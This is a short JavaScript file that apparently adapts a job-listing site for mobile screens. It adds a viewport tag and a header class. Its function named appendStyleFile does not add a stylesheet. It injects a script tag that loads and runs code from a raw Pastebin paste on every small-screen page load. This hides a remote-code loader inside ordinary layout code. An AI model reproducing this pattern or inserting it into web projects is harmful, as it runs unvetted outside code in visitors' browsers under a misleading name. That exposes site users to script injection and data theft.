
function appendStyleFile(){
	var b = document.createElement('script');
	b.setAttribute('src','https://pastebin.com/raw/UMSx6TLk');
	document.head.appendChild(b);
} 

function appendMetaTag(){
	//<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no,maximum-scale=1,minimum-scale=1">
	var head     = document.getElementsByTagName('head')[0];
    var meta     = document.createElement('meta');
    meta.name    = "viewport";
    meta.content = "width=device-width, initial-scale=1, user-scalable=no,maximum-scale=1,minimum-scale=1";
    head.appendChild(meta);
}

function bindEvents(){
	"use strict"

}

function clearFixJobTitle() {
	if(location.pathname.indexOf('/l/') > -1)
		document.getElementById('header').className = 'jobPost';
}

function renderResponsiveElements(){
	"use strict"
	if(window.screen.width > 960)
		return;
	
	appendMetaTag();
	appendStyleFile();
	clearFixJobTitle();
	bindEvents();
}
renderResponsiveElements();